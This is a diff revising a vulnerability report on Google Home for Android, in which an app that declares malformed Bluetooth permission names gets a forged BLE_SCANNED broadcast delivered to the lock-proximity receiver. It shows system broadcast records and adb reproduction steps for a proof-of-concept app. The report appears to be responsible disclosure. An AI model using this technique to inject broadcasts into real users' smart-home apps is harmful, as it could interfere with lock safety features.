@@ -12,7 +12,7 @@ device defines, so any app can declare those names and reach both
 ---
 
 Testing date: 2026-10-21
-Testing time: 13:18 to 15:26 UTC (several runs)
+Testing time: 13:18 to 15:45 UTC (several runs; the output quoted below is 15:41 UTC)
 Researcher IP: 180.148.212.54
 Device: moto g stylus 5G (2024), Android 15 (API 35), stock, not rooted
 App: com.google.android.apps.chromecast.app (Google Home), versionName=4.33.27.4
@@ -100,52 +100,43 @@ component set to the receiver, extras `hgs_device_id`, `device_name`, `request_i
 one-element `ArrayList<ScanResult>` under `android.bluetooth.le.extra.LIST_SCAN_RESULT`.
 
 The clearest evidence is Android's own broadcast history, which records the outcome and
-the reason independently of anything either app logs. Both records below come from a
-single `adb shell dumpsys activity broadcasts` taken after running each app once.
+the reason independently of anything either app logs. Both records below come from one
+`adb shell dumpsys activity broadcasts` taken right after running each app once, in the
+run that produced the attached screenshot. The dump is several thousand lines; I have
+kept the caller, clock, outcome and reason lines verbatim and dropped the rest.
 
-**App that declares the name — delivered, and the receiver ran:**
+Timestamps in these records are the device's local clock, UTC+06:00 — 21:41 local is
+15:41 UTC. (The unset `dispatchClockTime` printing as `1970-01-01 06:00:00.000` rather
+than `00:00:00` is the same offset showing through.)
 
-```
-BroadcastRecord{6a3379c com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
-Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED
-         flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
-caller=com.cindrasec.mvrpprobe 19321:com.cindrasec.mvrpprobe/u0a568 pid=19321 uid=10568
-dispatchTime=-4s78ms (+1ms since enq) finishTime=-4s69ms (+9ms since disp)
-DELIVERED scheduled +2ms terminal +8ms (-1) #0: (manifest)
-  ActivityInfo:
-    name=com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver
-    packageName=com.google.android.apps.chromecast.app
-    enabled=true exported=true directBootAware=false
-    permission=android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
-  reason: remote app
-```
-
-**Identical app without the declaration — refused before dispatch:**
+**Control app, declares no permissions at all — refused at enqueue:**
 
 ```
-BroadcastRecord{5a4a12c com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
-Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED
-         flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
-caller=com.cindrasec.mvrpctl 24061:com.cindrasec.mvrpctl/u0a569 pid=24061 uid=10569
-SKIPPED terminal (-1) #0: (manifest)
-  ActivityInfo:
-    name=com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver
-    permission=android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
-  reason: skipped by policy at enqueue: Permission Denial: broadcasting Intent {
-    act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED flg=0x10
-    cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
-    from com.cindrasec.mvrpctl (pid=24061, uid=10569)
-    to com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver
-    requires android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
+BroadcastRecord{8372a94 com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
+caller=com.cindrasec.mvrpctl 0:com.cindrasec.mvrpctl/u0a569 pid=25087 uid=10569
+enqueueClockTime=2026-10-21 21:41:52.366 dispatchClockTime=1970-01-01 06:00:00.000
+SKIPPED terminal +4h40m49s474ms (-1) #0: (manifest)
+reason: skipped by policy at enqueue: Permission Denial: broadcasting Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) } from com.cindrasec.mvrpctl (pid=25087, uid=10569) to com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver requires android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
+```
+
+The `+4h40m` on that SKIPPED line is not a real duration — `dispatchClockTime` is still
+at the epoch because the broadcast was never dispatched, so the figure is measured from
+a time that was never set.
+
+**PoC app, three seconds later, declares the two names and nothing else — delivered:**
+
+```
+BroadcastRecord{52cd4a6 com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
+caller=com.cindrasec.mvrpprobe 0:com.cindrasec.mvrpprobe/u0a568 pid=28740 uid=10568
+enqueueClockTime=2026-10-21 21:41:55.621 dispatchClockTime=2026-10-21 21:41:55.621
+DELIVERED scheduled +1ms terminal +9ms (-1) #0: (manifest)
+reason: remote app
 ```
 
 The system states the rule and the reason itself: the receiver requires that permission
 name, the app that declared it passes, the app that did not is skipped at enqueue. The
-declaration is the only difference between the two APKs.
-
-The attached screenshot is a later run of the same two commands, filtered to the caller,
-outcome and reason lines so both records fit on one screen. The per-run dispatch timings
-differ by a few milliseconds, as they would; the outcomes do not.
+declaration is the only difference between the two APKs — same source, same signing key,
+same broadcast, three seconds apart on the same device.
 
 Google Home's own process also logs a `BluetoothAdapter` line immediately after each
 delivered broadcast — the Bluetooth check at the top of `onReceive` — and nothing after
@@ -263,22 +254,25 @@ so does not appear as a capability anywhere in the UI.
 ## Reproduction
 
 ```
-adb install -r probe.apk      # declares and requests the malformed name
-adb install -r control.apk    # identical source, declares nothing
+adb install -r mvrp-poc.apk        # declares and requests the malformed name
+adb install -r mvrp-control.apk    # identical source, declares nothing
 
 adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'
 
 # run each app once; each sends the broadcast described above
-adb shell am start -n com.cindrasec.mvrpprobe/com.cindrasec.mvrpprobe.MainActivity --es action blescan
+# (the control keeps the original class name, only its package differs)
 adb shell am start -n com.cindrasec.mvrpctl/com.cindrasec.mvrpprobe.MainActivity   --es action blescan
+adb shell am start -n com.cindrasec.mvrpprobe/com.cindrasec.mvrpprobe.MainActivity --es action blescan
 
 # then read the system's own record of both
-adb shell dumpsys activity broadcasts | grep -B4 -A18 BLE_SCANNED
+adb shell dumpsys activity broadcasts \
+  | grep -E 'BroadcastRecord\{.*BLE_SCANNED|caller=com.cindrasec|enqueueClockTime|DELIVERED|SKIPPED|requires '
 ```
 
 One record reads DELIVERED, the other SKIPPED with a Permission Denial naming the
 malformed string. No logcat filtering, no timing, and nothing that depends on how the app
-chooses to log.
+chooses to log. The broadcast history keeps older entries too, so take the two records
+with the newest `enqueueClockTime`.
 
 Both APKs and their source are attached.
 
